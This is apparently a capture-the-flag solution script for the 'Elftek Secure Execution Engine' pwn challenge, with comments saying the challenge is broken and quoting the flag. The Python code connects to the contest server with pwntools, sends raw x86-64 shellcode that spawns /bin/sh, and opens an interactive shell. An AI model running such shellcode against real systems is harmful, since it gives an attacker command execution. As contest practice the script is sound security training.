# Elftek Secure Execution Engine (pwn 470)
# This challenge is broken. You can just send your shellcode and cat the flag.

# $ cat /home/ctf/flag.txt
# X-MAS{Y0U_C4n_p1cK_Y0ur_pR1VS_UP_sS3C0ndS_4F73R_dr0pp1N6_7H3m_59f9vh8sdhh}

from pwn import *

r = remote("challs.xmas.htsp.ro", 2004)
d = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
r.sendline(d)
r.interactive()
